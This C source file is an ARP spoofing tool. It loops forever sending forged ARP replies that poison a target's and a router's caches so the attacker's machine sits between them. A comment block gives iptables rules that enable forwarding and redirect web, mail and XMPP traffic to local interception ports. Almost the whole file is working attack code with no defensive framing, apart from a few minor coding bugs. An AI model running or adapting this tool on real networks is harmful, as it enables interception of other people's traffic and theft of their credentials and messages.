#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h> // getopt
#include <string.h>
#include <errno.h>

#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>

//# echo 1 > /proc/sys/net/ipv4/ip_forward

/* 
sudo ip link set dev wlan0 arp off


sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -F
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
sudo iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443
sudo iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443
sudo iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443
sudo iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080


remove

sudo sysctl -w net.ipv4.ip_forward=0
sudo iptables -t nat -F
sudo iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
sudo iptables -t nat -D PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
sudo iptables -t nat -D PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443
sudo iptables -t nat -D PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443
sudo iptables -t nat -D PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443
sudo iptables -t nat -D PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080

"Flush all the rules in filter and nat tables..."
    sudo iptables --flush
    sudo iptables --table nat --flush
    sudo iptables --delete-chain
*/

void print_usage() {
    printf("Usage: -i <device> -r <router's ip> -t <target's ip> \n");
}

int main (int argc, char **argv){
  /* GETOPT SETUP *?
    /* FLAGS */
    int sflag = 0; //<-- silent mode - no output
    int vflag = 0; //<-- verbose mode - extra output
    /* Required FLAGS */
    char *target_ip = NULL;
    char *router_ip = NULL;
    unsigned char  target_mac[6];
    unsigned char  router_mac[6];
    char *device = NULL;
  /* Constants */
  const unsigned char ether_broadcast_addr[]={0xff,0xff,0xff,0xff,0xff,0xff}; //<-- Broadcast address

  int c; //<-- counter
  int sd; //<-- socket descripton
  struct ifreq ifr; //<-- struct used to get info from ioctl
  int device_idx; //<-- device index number
  unsigned char  device_mac[6];
  struct sockaddr_ll taddr={0}; //<-- ethernet header, remainder must be zeroed
  struct sockaddr_ll raddr={0}; //<-- ethernet header, remainder must be zeroed
  struct ether_arp target_arpreply;
  struct ether_arp router_arpreply;
  struct timespec t = { 1/*seconds*/, 0/*nanoseconds*/};    
  char ch;
 
  while ((c = getopt(argc, argv, "sd:t:r:T:R:")) != -1){
    switch (c){
      case 's':
        sflag = 1;
        break;
      case 'v':
        vflag = 1;
        break;
      case 'r':
        router_ip = optarg;
        break;
      case 'R':
        printf("router %s\n", optarg);
        sscanf(optarg, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &router_mac[0], &router_mac[1], &router_mac[2], &router_mac[3], &router_mac[4], &router_mac[5]);
        puts(router_mac);
        break;
      case 't':
        target_ip = optarg;
        break;
      case 'T':
        printf("target %s\n", optarg);
        sscanf(optarg, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &target_mac[0], &target_mac[1], &target_mac[2], &target_mac[3], &target_mac[4], &target_mac[5]);
        puts(target_mac);
        break;
      case 'd':
        device = optarg;
        break;
      default: 
        print_usage(); 
        exit(EXIT_FAILURE);
    }
  }

  if (router_ip == NULL || target_ip == NULL || router_mac == NULL || target_mac == NULL || device == NULL ) {
    print_usage();
    exit(EXIT_FAILURE);
  }

  printf ("Specified target = %s/%s, router = %s/%s, device = %s\n", target_ip, target_mac, router_ip, router_mac, device);

  if ((sd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP))) == -1){
    puts("ERROR: Socket Creation Failed. Run with ROOT Privlliges");
    exit(EXIT_FAILURE);
  }

  size_t if_name_len=strlen(device);
  if (if_name_len<sizeof(ifr.ifr_name)) { //<-- make sure that the name entered is less then fixed size of ifr_name
    memcpy(ifr.ifr_name,device,if_name_len);
    ifr.ifr_name[if_name_len]=0;
  } else {
    puts("device name is too long");
    exit(EXIT_FAILURE);
  }
  if (ioctl(sd,SIOCGIFINDEX,&ifr)==-1) {
    puts(strerror(errno));
    exit(EXIT_FAILURE);
  }
  device_idx=ifr.ifr_ifindex;
  printf("Device index: %i\n", device_idx);

  if (ioctl(sd,SIOCGIFHWADDR,&ifr)==-1) {
    puts(strerror(errno));
    exit(EXIT_FAILURE);
  }
  memcpy(&device_mac,&ifr.ifr_addr.sa_data,sizeof(device_mac));

  // Convert MAC address to byte arrays

  taddr.sll_family=AF_PACKET;
  taddr.sll_ifindex=device_idx;
  taddr.sll_halen=ETHER_ADDR_LEN;
  taddr.sll_protocol=htons(ETH_P_ARP);
  memcpy(taddr.sll_addr,target_mac,ETHER_ADDR_LEN);


  raddr.sll_family=AF_PACKET;
  raddr.sll_ifindex=device_idx;
  raddr.sll_halen=ETHER_ADDR_LEN;
  raddr.sll_protocol=htons(ETH_P_ARP);
  memcpy(raddr.sll_addr,router_mac,ETHER_ADDR_LEN);

  struct in_addr target_ip_addr = {0};
  if (!inet_aton(target_ip,&target_ip_addr)) {
      printf("%s is not a valid IP address",target_ip);
      exit(EXIT_FAILURE);
  }
  memcpy(&target_arpreply.arp_tpa,&target_ip_addr.s_addr,sizeof(target_arpreply.arp_tpa));
  struct in_addr router_ip_adr = {0};
  if (!inet_aton(router_ip,&router_ip_adr)) {
      printf("%s is not a valid IP address",router_ip);
      exit(EXIT_FAILURE);
  }
  memcpy(&router_arpreply.arp_tpa,&router_ip_adr.s_addr,sizeof(router_arpreply.arp_tpa));

  target_arpreply.arp_hrd=htons(ARPHRD_ETHER);
  target_arpreply.arp_pro=htons(ETH_P_IP);
  target_arpreply.arp_hln=ETHER_ADDR_LEN;
  target_arpreply.arp_pln=sizeof(in_addr_t);
  target_arpreply.arp_op=htons(ARPOP_REPLY);
  memcpy(&target_arpreply.arp_tpa,&target_ip_addr.s_addr,sizeof(target_arpreply.arp_tpa));
  memcpy(&target_arpreply.arp_tha,&target_mac,sizeof(target_arpreply.arp_tha));
  memcpy(&target_arpreply.arp_spa,&router_ip_adr.s_addr,sizeof(target_arpreply.arp_spa));
  memcpy(&target_arpreply.arp_sha,&device_mac,sizeof(target_arpreply.arp_sha));

  router_arpreply.arp_hrd=htons(ARPHRD_ETHER);
  router_arpreply.arp_pro=htons(ETH_P_IP);
  router_arpreply.arp_hln=ETHER_ADDR_LEN;
  router_arpreply.arp_pln=sizeof(in_addr_t);
  router_arpreply.arp_op=htons(ARPOP_REPLY);
  memcpy(&router_arpreply.arp_tpa,&router_ip_adr.s_addr,sizeof(router_arpreply.arp_tpa));
  memcpy(&router_arpreply.arp_tha,&router_mac,sizeof(router_arpreply.arp_tha));
  memcpy(&router_arpreply.arp_spa,&target_ip_addr.s_addr,sizeof(router_arpreply.arp_spa));
  memcpy(&router_arpreply.arp_sha,&device_mac,sizeof(router_arpreply.arp_sha));


  

  int num_arp_sent= 0;
  



  while (1){
    if (sendto(sd,&router_arpreply,sizeof(router_arpreply),0,(struct sockaddr*)&raddr,sizeof(raddr))==-1) {
      puts(strerror(errno));
      exit(EXIT_FAILURE);
    }
    if (sendto(sd,&target_arpreply,sizeof(target_arpreply),0,(struct sockaddr*)&taddr,sizeof(taddr))==-1) {
      puts(strerror(errno));
      exit(EXIT_FAILURE);
    } 
    puts("ARP SENT");
    num_arp_sent++;
    nanosleep(&t,NULL);
    if (sendto(sd,&target_arpreply,sizeof(target_arpreply),0,(struct sockaddr*)&taddr,sizeof(taddr))==-1) {
      puts(strerror(errno));
      exit(EXIT_FAILURE);
    } 
  }
  close(sd);
  return 0;
}

/* srcs:
      http://www.microhowto.info/howto/send_an_arbitrary_ethernet_frame_using_an_af_packet_socket_in_c.html
      http://www.microhowto.info/howto/get_the_index_number_of_a_linux_network_device_in_c_using_siocgifindex
      http://www3.amherst.edu/~jwmanly/resnet97/getarp.crew
*/
